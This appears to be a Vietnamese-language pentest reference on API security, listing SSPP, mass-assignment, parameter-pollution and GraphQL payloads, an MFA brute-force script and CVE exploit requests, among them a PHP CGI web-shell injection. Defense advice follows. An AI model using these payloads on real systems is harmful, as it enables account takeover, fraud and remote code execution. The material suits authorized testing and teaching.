# API Testing & Security

> Kiểm thử các API REST/RPC về xác thực/phân quyền, BOLA, mass assignment, và lộ dữ liệu quá mức. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/api_testing.md`](../../../../Troubleshooting_Guide/api_testing.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** OWASP API Top 10
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
Bảo mật API bao gồm các lỗ hổng đặc thù của giao diện máy-tới-máy — các endpoint REST, RPC và GraphQL
phơi bày trực tiếp logic nghiệp vụ. Các lỗi phổ biến nhất là lỗi phân quyền (BOLA/IDOR, phân quyền
cấp chức năng bị hỏng), mass assignment, lộ dữ liệu quá mức, và kiểm soát yếu đối với các phương thức
và phiên bản không được ghi trong tài liệu.

## Cơ chế hoạt động (How it works)
API tin tưởng client nhiều hơn hẳn so với một ứng dụng web kết xuất trang: ID của đối tượng đi trong
URL/body, toàn bộ mô hình dữ liệu thường được tuần tự hóa (serialize) trả về, và các framework binding
tự động ánh xạ các khóa JSON lên đối tượng phía máy chủ. Kẻ tấn công kiểm soát ID, các trường thừa,
phương thức HTTP, và các tham số trùng lặp; ứng dụng không kiểm tra rằng *người dùng này* được phép
chạm vào *đối tượng kia*, mù quáng gán các trường do kẻ tấn công cung cấp như `role`/`isAdmin`, hoặc
định tuyến một giá trị bị "nhiễm" vào một request nội bộ (SSPP). Các endpoint ẩn (shadow), phiên bản
API cũ, và thông báo lỗi quá chi tiết càng nới rộng khe hở.

## Tác động (Impact)
Leo thang đặc quyền theo chiều ngang và chiều dọc (đọc/sửa đối tượng của người dùng khác, tự cấp quyền
admin cho mình), chiếm tài khoản (rò rỉ reset token qua SSPP, role bị mass-assign), thao túng tài chính
(đưa giá/phí vận chuyển về 0), và rò rỉ dữ liệu hàng loạt khi API trả về quá nhiều trường. Mức nghiêm
trọng dao động từ trung bình đến nghiêm trọng (critical) — BOLA và mass-assignment-thành-admin thường
xuyên ở mức critical.

## Cách phát hiện (How to detect)
- Đổi hoặc tăng dần ID đối tượng và quan sát xem có nhận về dữ liệu của người dùng khác thay vì `403`.
- Thêm các trường JSON bất ngờ (`role`, `isAdmin`, `balance`) và kiểm tra xem chúng có hiệu lực không.
- `OPTIONS` để đọc header `Allow`; thử `PATCH`/`PUT`/`DELETE` mà tài liệu không hề nhắc tới.
- URL-encode `&`, `#`, `?` vào một giá trị được phản hồi lại và tìm token bị rò rỉ hoặc hành vi thay đổi
  (SSPP); khác biệt thời gian hoặc kích thước phản hồi xác nhận các biến thể blind.
- Dò `/api/docs`, `/openapi.json`, `/swagger.json` và cắt bớt các đoạn đường dẫn để lập bản đồ bề mặt.

## Khai thác (tóm tắt) (Exploitation)
Lập bản đồ bề mặt từ tài liệu/introspection và việc cắt đường dẫn, rồi tấn công phân quyền trước:
liệt kê ID đối tượng (BOLA) và gọi các chức năng đặc quyền với tư cách người dùng quyền thấp.
Mass-assign các trường ẩn trên endpoint tạo/cập nhật. Lén chèn tham số bằng SSPP/HPP — mã hóa
`%26field=...%23` vào tên người dùng để rò rỉ reset token, hoặc trùng lặp khóa để vượt rate limit.
Quay về dùng các phiên bản API cũ vốn bỏ qua kiểm soát. Payload đầy đủ nằm trong phần Payload và tài
liệu chuyên sâu.

## Payload & kỹ thuật (Payloads & techniques)

> Được chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

### Server-Side Parameter Pollution (SSPP)

Chèn thêm tham số hoặc cắt cụt truy vấn back-end bằng cách URL-encode `&`, `#`, và `?` vào một giá trị mà máy chủ phản hồi lại vào một request nội bộ.

```http
username=administrator%26x=y                 # inject &x=y
username=administrator%23                     # truncate query string with #
username=administrator%26field=email%23
username=administrator%26field=reset_token%23
username=administrator%26field=password%23
username=administrator%26field=passwordResetToken%23
```

Luồng điển hình: POST tới `/forgot-password` với `username=<target>%26field=<field>%23`, trích xuất token bị rò rỉ (thường là 32 ký tự hex) từ phản hồi, rồi đặt lại mật khẩu và đăng nhập.

Biến thể dựa trên đường dẫn REST — cắt cụt hoặc duyệt đường dẫn nội bộ:

```http
username=administrator#                        # truncate path
username=administrator?                         # confirm path placement
username=./administrator                        # relative path (same)
username=../administrator                       # parent directory
username=../../../../#                           # find API root
username=../../../../openapi.json#
username=administrator/field/email#
username=administrator/field/passwordResetToken#
username=../../v1/users/administrator/field/passwordResetToken#
```

### Khám phá tài liệu & đường dẫn API (API documentation & path discovery)

```http
GET /api
GET /api/docs
GET /api/swagger
GET /api/swagger.json
GET /api/openapi.json
GET /api/v1
GET /swagger-ui
GET /graphql
```

Recon bằng cắt cụt đường dẫn — bóc bớt các đoạn để lộ cấu trúc: `GET /api/user/wiener` → `GET /api/user` → `GET /api`. Danh sách đường dẫn tài liệu mở rộng:

```bash
/api  /api/v1  /api/v2  /api/v3
/api/docs  /api/swagger  /api/redoc
/swagger.json  /swagger.yaml  /openapi.json  /openapi.yaml
/graphql  /api/graphql
/.well-known/openapi.json
```

### Phương thức HTTP không dùng / ẩn (Unused / hidden HTTP methods)

```http
OPTIONS /api/products/3/price        # read Allow header for supported methods

PATCH /api/products/3/price
Content-Type: application/json
{"price": 0}

PUT /api/products/3/price
Content-Type: application/json
{"price": 0}

DELETE /api/user/carlos
```

### Mass assignment

Gửi các trường đặc quyền ẩn mà client không bao giờ gửi. Mục tiêu phổ biến: `role`, `isAdmin`, `balance`, `credits`, `price`, `shipping_cost`, `tax_amount`, `chosen_discount`, `reset_token`, `api_key`.

```json
POST /api/checkout
{ "chosen_discount": {"percentage": 100},
  "chosen_products": [{"product_id": "1", "quantity": 1}] }
```

```json
POST /api/users/register
{ "username": "attacker", "password": "pass123",
  "email": "attacker@evil.com", "role": "admin", "isAdmin": true }
```

```json
POST /api/profile/update
{ "name": "John", "email": "john@example.com",
  "balance": 999999, "credits": 999999 }
```

```json
POST /api/orders
{ "items": [{"id": 1, "qty": 2}], "address": "123 Main St",
  "shipping_cost": 0, "tax_amount": 0, "is_premium": true }
```

Mass assignment lồng nhau giấu trường sâu thêm một cấp:

```json
POST /api/user/update
{ "profile": { "name": "John",
    "settings": { "notifications": true, "role": "admin" } } }
```

### Các biến thể parameter pollution (Parameter pollution variants)

HTTP Parameter Pollution (HPP) — cùng một khóa hai lần; giá trị nào thắng tùy thuộc nền tảng:

```http
GET /api/transfer?amount=1&from=user1&to=attacker&amount=1000
# PHP/Apache: last value wins (1000)
# ASP.NET:    comma-joined (1,1000)
# JSP/Tomcat: first value (1)
```

JSON parameter pollution — khóa trùng lặp, bộ phân tích giữ giá trị cuối:

```json
POST /api/checkout
{ "total": 10, "total": 0 }
```

Vượt bộ lọc bằng mã hóa hai lần — sống sót qua một lượt giải mã:

```http
username=admin%2526field%253Dtoken%2523
# -> admin%26field%3Dtoken%23 -> admin&field=token#
```

Blind SSPP (theo thời gian) — so sánh thời gian phản hồi giữa các lần đoán trường:

```http
username=admin&field=email#
username=admin&field=password#
username=admin&field=api_key#
```

Vượt rate-limit — bộ giới hạn khóa theo một tham số, backend đọc tham số khác:

```http
POST /api/forgot-password
username=dummy&user=admin#
```

### Bề mặt GraphQL (GraphQL surface)

```graphql
# introspection discovery
{ __schema { types { name fields { name type { name } } } } }
```

```graphql
mutation {
  updateUser(input: { name: "John", isAdmin: true, balance: 999999 }) {
    user { id name }
  }
}
```

### Trộn lẫn phiên bản API (API version mixing)

Các phiên bản cũ có thể bỏ qua những kiểm soát mà phiên bản hiện tại bắt buộc.

```http
POST /api/users
X-API-Version: 1

POST /api/v1/users
POST /api/users?version=1
POST /api/users   {"api_version": "1", "data": {...}}
```

### Xác thực: liệt kê & brute force 2FA (Authentication: enumeration & 2FA brute force)

Liệt kê tên người dùng qua khác biệt thông báo lỗi (`Invalid username` so với lỗi mật khẩu). Một khi đã xác nhận tên người dùng, brute-force mật khẩu của họ. Với mã MFA 4 chữ số, quét cạn `0000`–`9999`, theo dõi một `302` tới `/my-account`:

```http
POST /login2
csrf=<csrf>&mfa-code=0000
...
csrf=<csrf>&mfa-code=9999
```

```python
import requests
from bs4 import BeautifulSoup

URL = "https://target.web-security-academy.net"
s = requests.Session()

def login():
    r = s.get(f"{URL}/login")
    csrf = BeautifulSoup(r.text, "html.parser").find("input", {"name": "csrf"})["value"]
    s.post(f"{URL}/login", data={"csrf": csrf, "username": "carlos", "password": "montoya"})
    r = s.get(f"{URL}/login2")
    return BeautifulSoup(r.text, "html.parser").find("input", {"name": "csrf"})["value"]

for i in range(10000):
    if i % 2 == 0:
        csrf = login()
    r = s.post(f"{URL}/login2", data={"csrf": csrf, "mfa-code": str(i).zfill(4)}, allow_redirects=False)
    if r.status_code == 302 and "/my-account" in r.headers.get("Location", ""):
        print(f"Code found: {str(i).zfill(4)}")
        break
```

### CVE thực tế (Real-world CVEs)

```http
# CVE-2024-21887 — Ivanti Connect Secure (SSPP auth bypass)
POST /api/v1/totp/user-backup-code/../../system/user/admin
```

```json
POST /app/rest/users        # CVE-2023-42793 — JetBrains TeamCity (mass assignment)
{ "username": "newuser", "password": "pass123", "roles": ["SYSTEM_ADMIN"] }
```

```http
# CVE-2024-4577 — PHP CGI argument injection
GET /index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input
# body: <?php system($_GET[cmd]); ?>
```

### Bảng tra mã hóa URL (URL-encoding reference)

| Ký tự | Mã hóa | Mục đích |
|------|---------|---------|
| `&`  | `%26`   | chèn thêm tham số |
| `#`  | `%23`   | cắt cụt URL / query string |
| `?`  | `%3F`   | bắt đầu query string mới |
| `.`  | `%2E`   | path traversal |
| `/`  | `%2F`   | path traversal |
| `\`  | `%5C`   | path traversal (Windows) |

## Phòng chống (Defenses)
1. **Bắt buộc phân quyền cấp đối tượng (object-level authorization)** trên mọi endpoint — kiểm tra phía
   máy chủ rằng người gọi sở hữu/được phép truy cập ID được tham chiếu; không bao giờ tin client chỉ
   gửi "ID của chính nó".
2. **Bắt buộc phân quyền cấp chức năng (function-level authorization)** — gắn cổng cho mọi phương
   thức/route theo vai trò; mặc định từ chối.
3. **Lập danh sách cho phép các trường có thể bind** (DTO / ánh xạ trường tường minh); không bao giờ
   tự động bind toàn bộ body request lên đối tượng nghiệp vụ, qua đó chặn mass assignment.
4. **Chỉ trả về các trường mà client cần** — không tuần tự hóa quá mức các trường nội bộ/nhạy cảm.
5. Kiểm tra và chuẩn hóa (canonicalize) đầu vào trước khi nó đi vào request nội bộ (vô hiệu hóa
   SSPP/HPP); quyết định một chính sách xác định cho tham số trùng lặp.
6. Loại bỏ các phiên bản API cũ, gỡ bỏ các phương thức không có trong tài liệu, áp rate-limit và xác
   thực nhất quán giữa các phiên bản, và duy trì kiểm kê chính xác mọi endpoint phơi bày.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=API+Testing+&+Security
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=API+Testing+&+Security
- **Exploit-DB** — https://www.exploit-db.com/search?q=API+Testing+&+Security
- **GitHub Advisories** — https://github.com/advisories?query=API+Testing+&+Security
- **OSV** — https://osv.dev/list?q=API+Testing+&+Security
- **Cộng đồng** — r/netsec, blog bảo mật của hãng, HackerOne Hacktivity, infosec trên X/Twitter.
- _Mẹo tìm kiếm: thêm sản phẩm mục tiêu + phiên bản, ví dụ `API Testing & Security <sản phẩm> <phiên bản>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi trích dẫn._
- `CVE-2024-21887` — Command injection trong Ivanti Connect Secure, nối chuỗi với một auth-bypass qua
  path traversal trên API (`../../system/...`); bị khai thác hàng loạt đầu năm 2024.
- `CVE-2023-42793` — Auth bypass trên REST API của JetBrains TeamCity cho phép tạo token/tài khoản
  admin (mass assignment vai trò).
- `CVE-2018-1000861` — Lỗi gọi phương thức Stapler API của Jenkins cho phép truy cập không xác thực
  tới các phương thức nội bộ.

## Tham khảo (References)
- PortSwigger Web Security Academy — API testing.
- OWASP API Security Top 10 (2023).
- OWASP REST Security Cheat Sheet & Mass Assignment Cheat Sheet.
